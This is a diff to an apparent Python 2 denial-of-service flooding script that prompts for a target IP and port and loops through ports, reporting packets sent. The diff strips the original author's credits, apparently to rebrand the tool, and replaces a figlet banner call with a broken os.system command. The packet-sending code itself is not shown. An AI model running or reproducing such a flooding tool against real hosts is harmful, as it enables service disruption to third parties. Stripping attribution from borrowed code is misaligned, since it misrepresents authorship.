@@ -22,17 +22,13 @@ os.system("clear")
 os.system("Dinial Pro")
 print
 print("===========°°°°°°============")
-print(" Coded by : 0xAbbarhSF       ")
-print("    GitHub : 0xAbbarhSF      ")
-print("   Twitter : 0xAbbarhSF      ")
 print("==========°°°°°°°============")
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 os.system("clear")
 print("\033[93m")
-os.system("figlet DdoS Attack")
-print("intel : 0xAbbarhSF")
+os.system("DdoS Attack")
 print ("\033[92m")
 print ("Working......")
 time.sleep(5)
@@ -54,4 +50,3 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-#https://github.com/0xAbbarhSF
